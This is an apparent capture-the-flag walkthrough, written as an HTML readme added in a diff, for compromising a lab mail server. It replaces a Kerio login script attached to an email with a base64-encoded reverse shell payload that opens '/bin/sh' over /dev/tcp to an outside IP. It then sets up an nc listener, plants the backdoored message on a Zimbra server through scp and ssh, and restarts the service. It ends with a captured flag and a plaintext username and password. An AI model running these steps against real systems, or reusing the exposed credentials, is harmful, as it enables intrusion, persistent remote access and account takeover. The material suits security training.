@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang xml:lang>
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Readme</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+  </style>
+  <style type="text/css">body {
+font-family: Arial, sans-serif;
+line-height: 1.6;
+background-color: #121212;
+color: #e0e0e0;
+padding: 20px;
+}
+h1, h2, h3, h4, h5, h6 {
+color: #ff9800; 
+}
+code {
+background-color: #333;
+padding: 2px 4px;
+border-radius: 4px;
+font-family: 'Courier New', Courier, monospace;
+color: #ff5722; 
+}
+pre {
+background-color: #333;
+padding: 10px;
+border-radius: 4px;
+overflow-x: auto;
+color: #ff5722; 
+}
+a {
+color: #bb86fc;
+text-decoration: none;
+}
+a:hover {
+text-decoration: underline;
+}
+ul {
+margin: 20px 0;
+padding: 0 20px;
+border-left: 2px solid #ff9800; 
+}
+li {
+margin: 10px 0;
+}
+strong {
+color: #ff9800; 
+}
+</style>
+</head>
+<body>
+<h1 id="pc3">PC3</h1>
+<ol type="1">
+<li>Resume From <a href="/2_mail_server/">🗂 Mail Server</a></li>
+<li>Check Emails: <a href="/2_mail_server/08-store0/3/msg/0/258-3.msg">🗂 258-3.msg</a></li>
+</ol>
+<pre class="text"><code>سلام
+نرم افزار درخواست شده را پیوست کردم.</code></pre>
+<pre class="shell"><code>#!/bin/bash
+
+username=&quot;&quot;
+password=&quot;&quot; 
+
+server_ip=$(ip r | grep default | cut -f 3 -d &#39; &#39;)
+server_ip=&quot;&quot;
+case &quot;$1&quot; in
+logout)
+ curl --insecure -X GET https://$server_ip:4081/internal/logout
+ ;;
+*)
+
+ if [ -z $username ]; then
+  read -p &quot;Enter the Username:&quot; username
+ fi
+
+ # if password is empty get it!
+ if [ -z $password ]; then
+  read -sp &quot;Password:&quot; password
+ fi
+
+ curl --insecure -X POST https://$server_ip:4081/internal/dologin.php?NTLM=0 --data-urlencode &quot;kerio_username=$username&quot; --data-urlencode &quot;kerio_password=$password&quot;
+
+ res=$(curl -I https://www.google.com -m 5 2&gt;/dev/null | head -n 1 | cut -f 2 -d &quot; &quot;)
+ if [[ $res == &quot;200&quot; ]]; then
+  printf &quot;\033[1m\033[92mYou Are Connected Now!\033[0m&quot;
+ else
+  printf &quot;\033[1m\033[91mNot Connected!\033[0m&quot;
+ fi
+ printf &quot;\n\n&quot;
+esac</code></pre>
+<ol start="3" type="1">
+<li>Create a Reverse Shell Payload</li>
+</ol>
+<pre class="shell"><code>ls;/bin/sh -i &gt;&amp; /dev/tcp/10.8.0.29/9999 0&gt;&amp;1;</code></pre>
+<ol start="4" type="1">
+<li>Encode Base64 and Replace as <code>kerio_connect</code> attachment: <a href="./04-258-3-backdoor.msg">🗂 kerio_connect</a></li>
+<li>Listen On local System: <code>nc -l 0.0.0.0 9999</code></li>
+<li>Copy Backdoored Email into Server</li>
+</ol>
+<pre class="shell"><code>scp -i ~/.ssh/id_rsa -P 2200 ./04-258-3-backdoor.msg  zimbra@172.16.3.67:/opt/zimbra/store/0/3/msg/0</code></pre>
+<ol start="7" type="1">
+<li>Login and Replace Email, Restart Zimbra</li>
+</ol>
+<pre class="shell"><code>ssh -i ~/.ssh/id_rsa -p 2200 zimbra@172.16.3.67
+
+# inside ssh
+cd /opt/zimbra/store/0/3/msg/0/
+mv 258-3.msg 258-3.bak.msg
+mv 04-258-3-backdoor.msg 258-3.msg
+
+# restarting Zimbra
+zmcontrol restart</code></pre>
+<ol start="8" type="1">
+<li>Read Flag: MAZAPA_e8be86e920cb98bc93e7d3803912e72a</li>
+<li>Read <code>/read.py</code> and Get Username/Password</li>
+</ol>
+<pre class="text"><code>username = &quot;savad-koohi@petromaz.ir&quot;
+password = &quot;EmdQXL82YejA&quot;
+server = &quot;mail&quot;</code></pre>
+</body>
+</html>
